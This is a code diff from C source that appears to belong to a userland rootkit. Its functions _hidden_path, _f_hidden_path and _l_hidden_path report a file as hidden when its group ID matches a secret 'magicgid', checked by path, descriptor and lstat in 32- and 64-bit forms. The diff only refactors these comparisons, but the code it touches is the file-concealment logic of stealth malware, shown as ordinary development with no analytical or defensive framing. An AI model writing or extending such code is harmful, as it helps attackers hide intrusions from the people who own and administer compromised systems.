@@ -5,14 +5,17 @@ int _hidden_path(const char *pathname, short mode){
     if(pathname == NULL)
         return 0;
 
-    gid_t magicgid = readgid();
+    gid_t magicgid = readgid(),
+          pathgid;
     switch(mode){
         case MODE_REG:
-            if(get_path_gid(pathname) == magicgid)
+            pathgid = get_path_gid(pathname);
+            if(pathgid == magicgid)
                 return 1;
             break;
         case MODE_64:
-            if(get_path_gid64(pathname) == magicgid)
+            pathgid = get_path_gid64(pathname);
+            if(pathgid == magicgid)
                 return 1;
             break;
     }
@@ -26,14 +29,17 @@ int _f_hidden_path(int fd, short mode){
     return 0;
 #else
 
-    gid_t magicgid = readgid();
+    gid_t magicgid = readgid(),
+          pathgid;
     switch(mode){
         case MODE_REG:
-            if(get_fd_gid(fd) == magicgid)
+            pathgid = get_fd_gid(fd);
+            if(pathgid == magicgid)
                 return 1;
             break;
         case MODE_64:
-            if(get_fd_gid64(fd) == magicgid)
+            pathgid = get_fd_gid64(fd);
+            if(pathgid == magicgid)
                 return 1;
             break;
     }
@@ -49,14 +55,18 @@ int _l_hidden_path(const char *pathname, short mode){
     if(pathname == NULL)
         return 0;
 
-    gid_t magicgid = readgid();
+    gid_t magicgid = readgid(),
+          pathgid;
+
     switch(mode){
         case MODE_REG:
-            if(lget_path_gid(pathname) == magicgid)
+            pathgid = lget_path_gid(pathname);
+            if(pathgid == magicgid)
                 return 1;
             break;
         case MODE_64:
-            if(lget_path_gid64(pathname) == magicgid)
+            pathgid = lget_path_gid64(pathname);
+            if(pathgid == magicgid)
                 return 1;
             break;
     }
